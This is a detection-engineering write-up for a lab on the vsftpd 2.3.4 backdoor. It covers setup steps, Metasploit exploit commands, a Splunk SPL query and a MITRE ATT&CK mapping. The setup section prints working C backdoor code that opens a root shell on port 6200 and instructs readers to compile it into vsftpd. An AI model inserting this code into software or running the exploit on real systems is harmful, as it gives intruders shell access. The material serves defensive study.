
# Detection Use Case: Exploiting vsftpd 2.3.4 via Metasploit

## 🧪 Scenario Description
An attacker exploits a known backdoor in vsftpd version 2.3.4 using the Metasploit Framework. The vsftpd 2.3.4 vulnerability allows an attacker to obtain a reverse shell by connecting with a specially crafted username.

## 🎯 Objective
Detect the exploitation attempt and subsequent reverse shell activity, especially focusing on unexpected shell access initiated through FTP service ports (usually 21) or reverse shell callbacks.

## 🛠️ Tools & Setup
- **Offensive Tool**: Metasploit
  - Module: `exploit/unix/ftp/vsftpd_234_backdoor`
- **Detection Tools**: 
  - Netcat listener
  - SIEM (e.g., Splunk, ELK, Wazuh)
- **Lab Environment**:
  - Vulnerable target with vsftpd 2.3.4
  - Attacker system with Metasploit installed
  - SIEM monitoring on network and host events

## ⚙️ Steps to Set Up the Backdoored vsftpd 2.3.4

### Clone the Repository
```bash
git clone https://github.com/DoctorKisow/vsftpd-2.3.4.git
cd vsftpd-2.3.4
```
![Screenshot 2025-06-01 233707](https://github.com/user-attachments/assets/bdc14b23-63ab-43a5-b363-349aacc2ceed)


### Install Dependencies
```bash
sudo apt-get update
sudo apt-get install build-essential libpam0g-dev
```
![Screenshot 2025-06-01 233744](https://github.com/user-attachments/assets/94a0df4b-fef2-41db-9608-7762820be8ee)


### Build the vsftpd Binary
```bash
chmod +x vsf_findlibs.sh
nano Makefile
```
![Screenshot 2025-06-01 233811](https://github.com/user-attachments/assets/b0e8186b-c578-45c1-b101-4c3d57284e0b)

In the `Makefile`, add `-lpam` and `-lcap` to the `LIBS` line, then save and exit.

![Screenshot 2025-06-01 233930](https://github.com/user-attachments/assets/984e2356-49e0-4dc1-8030-bb46af1d5b25)

In **str.c** add `vsf_sysutil_extra()` function and remove this function from **sysdeputil.c** : 
```bash
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

```bash
make
```
![Screenshot 2025-06-01 234033](https://github.com/user-attachments/assets/0165fddb-9df2-4525-95d9-fc23957580a5)


### Install the vsftpd Binary
```bash
sudo install -v -m 755 vsftpd /usr/sbin/vsftpd
sudo install -v -m 644 vsftpd.conf /etc/vsftpd.conf
```
![Screenshot 2025-06-01 234059](https://github.com/user-attachments/assets/c6445b6b-64b3-4061-ab3c-badf74f7bfd3)


### Start the vsftpd Service
```bash
sudo /usr/sbin/vsftpd /etc/vsftpd.conf
```
![Screenshot 2025-06-01 234133](https://github.com/user-attachments/assets/e7206e00-71ef-43cc-bdd2-6ef185339e3f)

**Note: Also check if proper user for ftp service exists or not**

## 📡 Detection Logic
Monitor for:
- Connection attempts to FTP (port 21) with suspicious usernames (e.g., those ending with `:)`).
- Unexpected outbound connections from the target system to uncommon external IPs/ports, indicating a reverse shell.
- New bash processes spawned without user interaction.
- Netcat (nc), bash, or sh running with suspicious parent processes like vsftpd.

## 🧪 Metasploit Usage
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target-ip>
run
```
![Screenshot 2025-06-01 233330](https://github.com/user-attachments/assets/1eb6ef20-db3a-446b-9953-68cd9d31c7c6)
---
![Screenshot 2025-06-01 233405](https://github.com/user-attachments/assets/be2849bb-e834-459f-9e1a-4f42bb9f05ee)


## 🔍 Detection Queries (Sample Splunk SPL)
```spl
  index="linux_logs"  
| rex field=_raw "<Data Name=\"SourceIp\">(?<SourceIp>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"DestinationIp\">(?<DestinationIp>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"DestinationPort\">(?<DestinationPort>\d+)</Data>"
| rex field=_raw "<Data Name=\"Image\">(?<Image>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"User\">(?<User>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"UtcTime\">(?<UtcTime>[^\<]+)</Data>"
| eval _time=strptime(UtcTime, "%Y-%m-%d %H:%M:%S.%3N")
| where DestinationPort="6200" OR User=":)"
| stats count min(_time) as first_seen max(_time) as last_seen by SourceIp DestinationIp DestinationPort Image User
| eval first_seen=strftime(first_seen, "%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen, "%Y-%m-%d %H:%M:%S")
| sort first_seen
```

## 📁 Log Fields to Monitor
| Field        | Description                                      |
|--------------|--------------------------------------------------|
| _time        | Timestamp of the event                           |
| host         | Affected system hostname                         |
| CommandLine  | Command used to spawn reverse shell              |
| ParentImage  | Process that initiated the command (e.g., vsftpd)|

## ⚠️ Alert
**Trigger Condition**: Reverse shell initiated by the vsftpd process or any suspicious connection after vsftpd service interaction.

## 🧪 Sample Event
```text
SourceIp	DestinationIp	DestinationPort	Image	User	count	first_seen	last_seen
192.168.1.11	192.168.1.3	6200	/usr/bin/ruby3.3	root	1	2025-06-01 18:02:05	2025-06-01 18:02:05
```

## 🕵️ Analyst Notes / Recommendations
- Verify if vsftpd version is vulnerable and exposed.
- Validate if the shell access was authorized or unexpected.
- Consider isolating the system and performing forensics.
- Patch or disable vsftpd 2.3.4 immediately.

## 🔗 MITRE ATT&CK Mapping
| Technique ID  | Technique Name                | Description                                           |
|---------------|-------------------------------|-------------------------------------------------------|
| T1190         | Exploit Public-Facing Application | Exploiting vulnerable vsftpd service                |
| T1059.004     | Command and Scripting Interpreter: Unix Shell | Use of bash for reverse shell access         |
| T1071.001     | Application Layer Protocol: Web | Reverse shell callback using TCP (bash/nc)           |
| T1049         | System Network Connections Discovery | Used for post-exploitation lateral movement planning |

---

✅ **Status**: Tested in a lab setup with Splunk and Metasploit. Reverse shell detection confirmed using command-line logs and parent process analysis.
